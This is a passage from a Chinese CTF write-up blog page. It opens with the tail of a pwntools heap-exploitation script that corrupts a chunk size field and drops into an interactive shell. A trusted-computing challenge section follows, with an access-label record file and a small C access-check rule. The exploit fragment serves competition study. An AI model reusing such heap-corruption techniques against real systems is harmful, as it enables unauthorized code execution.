</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x450</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1># 12</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x450</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1># 13</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x440</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1># 14</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x440</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1># 15</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>12</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x500</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1># 12</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=mi>14</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p1</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;a&#34;</span><span class=o>*</span><span class=mh>0x100</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span><span class=o>+</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x461</span><span class=p>)</span><span class=o>+</span><span class=n>payload</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=mi>11</span><span class=p>,</span><span class=nb>len</span><span class=p>(</span><span class=n>p1</span><span class=p>),</span><span class=n>p1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x500</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=mh>0x440</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;y4ng&#34;</span><span class=p>)</span> <span class=c1># 15</span>
</span></span><span class=line><span class=cl>    <span class=n>cmd</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>pwn</span><span class=p>()</span>
</span></span></code></pre></div><h1 id=crypto>crypto<a hidden class=anchor aria-hidden=true href=#crypto>#</a></h1><h2 id=å·¥ä¸šä¿¡æ¯>å·¥ä¸šä¿¡æ¯<a hidden class=anchor aria-hidden=true href=#å·¥ä¸šä¿¡æ¯>#</a></h2><p>ä¸€é“å¯ä¿¡è®¡ç®—é¢˜ï¼Œå­—å¤ªå¤šäº†è®©GPTå¸®æˆ‘è¯»æ–‡æ¡£ï¼Œæ ¹æ®ä»–ç»™çš„ä»£ç ä¿®æ”¹record.listå’Œå‡½æ•°</p><h3 id=recordlist>record.list<a hidden class=anchor aria-hidden=true href=#recordlist>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;type&#34;: &#34;MAC_LABEL&#34;,
</span></span><span class=line><span class=cl>    &#34;subtype&#34;: &#34;RECORD&#34;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;name&#34;: &#34;name&#34;,
</span></span><span class=line><span class=cl>    &#34;isleveladjust&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;isselfdefine&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;class&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>    &#34;level_fix&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;level_adjust&#34;: 0
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;name&#34;: &#34;ID&#34;,
</span></span><span class=line><span class=cl>    &#34;isleveladjust&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;isselfdefine&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;class&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>    &#34;level_fix&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;level_adjust&#34;: 0
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;name&#34;: &#34;department&#34;,
</span></span><span class=line><span class=cl>    &#34;isleveladjust&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;isselfdefine&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;class&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>    &#34;level_fix&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;level_adjust&#34;: 0
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;name&#34;: &#34;position&#34;,
</span></span><span class=line><span class=cl>    &#34;isleveladjust&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;isselfdefine&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;class&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>    &#34;level_fix&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;level_adjust&#34;: 0
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;name&#34;: &#34;YOF&#34;,
</span></span><span class=line><span class=cl>    &#34;isleveladjust&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;isselfdefine&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;class&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>    &#34;level_fix&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;level_adjust&#34;: 0
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;name&#34;: &#34;salary&#34;,
</span></span><span class=line><span class=cl>    &#34;isleveladjust&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;isselfdefine&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;class&#34;: &#34;F&#34;,
</span></span><span class=line><span class=cl>    &#34;level_fix&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;level_adjust&#34;: 0
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;name&#34;: &#34;cell&#34;,
</span></span><span class=line><span class=cl>    &#34;isleveladjust&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;isselfdefine&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;class&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>    &#34;level_fix&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;level_adjust&#34;: -1
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>    &#34;name&#34;: &#34;email&#34;,
</span></span><span class=line><span class=cl>    &#34;isleveladjust&#34;: 1,
</span></span><span class=line><span class=cl>    &#34;isselfdefine&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;class&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>    &#34;level_fix&#34;: 0,
</span></span><span class=line><span class=cl>    &#34;level_adjust&#34;: -2
</span></span><span class=line><span class=cl>}
</span></span></code></pre></div><h3 id=fuction>fuction<a hidden class=anchor aria-hidden=true href=#fuction>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>	<span class=c1>// add except rule check here
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>record_name</span><span class=p>,</span> <span class=s>&#34;salary&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// åˆ¤æ–­æ˜¯å¦æ˜¯æœ¬äººæŸ¥è¯¢
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>read_user</span><span class=p>,</span> <span class=n>record_user</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>  <span class=c1>// å…è®¸è®¿é—®
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/pwn/>PWN</a></li><li><a href=http://localhost:1313/tags/writeups/>Writeups</a></li><li><a href=http://localhost:1313/tags/ctf/>Ctf</a></li></ul><nav class=paginav><a class=next href=http://localhost:1313/posts/pwn/protobuf/><span class=title>Next Â»</span><br><span>Protobuf pwn</span></a></nav></footer><div><div class=pagination__title><span class=pagination__title-h style=font-size:20px>ğŸ’¬è¯„è®º</span><hr></div><div id=tcomment></div><script src=https://cdn.staticfile.org/twikoo/1.6.32/twikoo.all.min.js></script><script>twikoo.init({envId:PLACEHOLDER_FOR_ENV_ID,el:"#tcomment",lang:"zh-CN",region:"",path:window.TWIKOO_MAGIC_PATH||window.location.pathname})</script></div></article></main><footer class=footer><div class=busuanzi-footer><span id=busuanzi_container_site_pv>æœ¬ç«™æ€»è®¿é—®é‡<span id=busuanzi_value_site_pv></span>æ¬¡
</span><span id=busuanzi_container_site_uv>æœ¬ç«™è®¿å®¢æ•°<span id=busuanzi_value_site_uv></span>äººæ¬¡</span></div><span>&copy; 2024 <a href=http://localhost:1313/>Y4ng's blog</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>window.addEventListener("load",function(){var t=document.querySelectorAll('.highlight code[class^="language-"]'),n=document.querySelectorAll('.highlight code[class^="hljs "]'),e=!1;t.forEach(function(t,s){t.addEventListener("scroll",function(){e||(e=!0,n[s].scrollTop=t.scrollTop,e=!1)})}),n.forEach(function(n,s){n.addEventListener("scroll",function(){e||(e=!0,t[s].scrollTop=n.scrollTop,e=!1)})})})</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>